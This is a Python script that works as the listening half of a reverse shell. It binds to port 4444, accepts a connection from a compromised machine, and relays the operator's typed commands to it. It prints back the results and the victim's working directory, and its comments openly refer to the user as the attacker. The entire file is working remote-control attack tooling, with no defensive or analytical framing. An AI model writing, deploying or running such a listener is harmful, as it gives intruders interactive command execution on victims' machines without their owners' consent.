import socket
import os
import time # needed to handle connection lag

os.system("clear || cls")
def AwaitConnection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("1.2.3.4", 4444))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 4444')
    conn, addr = s.accept()
    
    print('[+] We got a connection from: ', addr)
    disconnect = 'exit'
    conn.setblocking(False) # flag to raise exception when trying to read with no data
    
    conn.send(str.encode('cd')) # default first command to get starting path
    time.sleep(1) # sleep needed for response
    curr_dir = conn.recv(1024).decode("utf-8").split('\n')[-1] # get cwd
    while True:
        command = input('\n' + curr_dir)
        
        if command=="": # attacker entered an empty command
             continue
        
        if disconnect in command: # attacker wishes to disconnect
            conn.send(disconnect.encode('utf-8'))
            conn.close()
            break
        else:
            conn.send(str.encode(command))
            time.sleep(1) # sleep needed for response

            while True: # get all data in PIPE
                try:
                    client = str(conn.recv(1024).decode("utf-8")) # this should fail with lack of data
                    curr_dir = client.split('\n')[-1] # get the cwd (will be cwd on last instance of good data recieved)
                    print(client)
                except: # exception reached, end of data
                    break
        
if __name__ == '__main__':
    AwaitConnection()











